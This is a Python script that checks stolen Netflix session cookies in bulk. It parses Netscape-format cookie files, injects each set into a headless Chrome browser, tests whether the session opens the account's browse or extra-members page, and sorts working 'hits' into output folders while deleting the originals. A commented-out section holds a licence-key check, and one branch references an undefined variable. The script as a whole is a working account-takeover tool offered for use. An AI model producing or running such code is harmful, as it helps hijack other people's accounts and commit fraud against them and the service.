from selenium import webdriver
import json
import os
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import pyautogui
from pystyle import Colors, Colorate,Write,Add
import threading
import queue
import requests

# code = pyautogui.password(text='', title='', default='', mask='')

# if code == '':
# 	quit()
# ip = requests.get('https://checkip.amazonaws.com').text.strip()
# try:
# 	gf = requests.post("http://127.0.0.1:5000/check",json={code:ip})
# except:
# 	pyautogui.alert(text=f'server connection error', title='err')
# 	quit()
# print(gf.text)
# if "error" in gf.text:
# 	pyautogui.alert(text=f'{gf.text}', title='err')
# 	quit()


q = queue.Queue()




# kkk
# Set the path to your ChromeDriver executable
chrome_driver_path = '/path/to/chromedriver'

def make(r):

	cookiee = []


	for line in r.splitlines():
		fields = line.strip().split("\t")
		# print(fields)
		if len(fields) >= 7:
			cookie = {
	                "domain": fields[0].replace("www", ""),
	                "flag": fields[1],
	                "path": fields[2],
	                "secure": fields[3] == "TRUE",
	                "expiration": fields[4],
	                "name": fields[5],
	                "value": fields[6]}
			# print(cookie)
			cookiee.append(cookie)
	return cookiee

def check():
	global q
	op = webdriver.ChromeOptions()
	op.add_argument('headless')
	op.add_argument('--log-level=3')
	driver = webdriver.Chrome(options=op)
	while  not q.empty():
			filepath = q.get()
			# print(filepath.split("\\"))

			filename = filepath.split("\\")[1]
			with open(filepath, "r", encoding="utf-8") as file:
				content = file.read()
				# print(content)
				# print("checking..")
				cookiee = []
				for line in content.splitlines():
					fields = line.strip().split("\t")
					if len(fields) >= 7:
						cookie = {
	                "domain": fields[0].replace("www", ""),
	                "flag": fields[1],
	                "path": fields[2],
	                "secure": fields[3] == "TRUE",
	                "expiration": fields[4],
	                "name": fields[5],
	                "value": fields[6]}
			# print(cookie)
						cookiee.append(cookie)


				


				mg = driver.get("https://www.netflix.com/in")

				# gg = make(content)
				try:

					for cookie in cookiee:
						driver.add_cookie(cookie)
						# print("done")

					driver.refresh()
					url =  driver.current_url
					# print(url)    
					if "https://www.netflix.com/browse" in str(url):
						hg = driver.get("https://www.netflix.com/ManageExtraMembers")
						driver.refresh()
						url =  driver.current_url
						if "ManageExtraMembers" in str(url):
							print(f"{Fore.GREEN}extra [+]HIT {filename} - DONE!{Style.RESET_ALL}!")
							with open(f"working/extra/[EXTRA][{str(element.text)}]-{filename}-nn.txt", "w", encoding="utf-8") as f:
										f.write(content)
							
						with open(f"working2/{filename}-nn.txt", "w", encoding="utf-8") as f:
							f.write(content)
							# print(gg)
							print(f"{Fore.GREEN}[+]HIT {filename} - DONE!{Style.RESET_ALL}!")

					else:
						print(f"{Fore.RED}[-]INVALID {filename} {Style.RESET_ALL}!")
						print("") 
				except:
					print(f"{Fore.RED}[-]ERROR {filename} {Style.RESET_ALL}!")
			os.remove(filepath)


def start():
	for filename in os.listdir("pathhh"):
			filepath = os.path.join("pathhh", filename)
			# print(filepath)
			if os.path.isfile(filepath):
				q.put(filepath)


	for _ in range(1):
		threading.Thread(target=check).start()

start()
# Create a new instance of the Chrome driver

# driver.add_cookie({"domain":".netflix.com","path":"/","name":"memclid","value":"8eaaebb5-cab5-405c-a495-8ada9e3db3ad"})
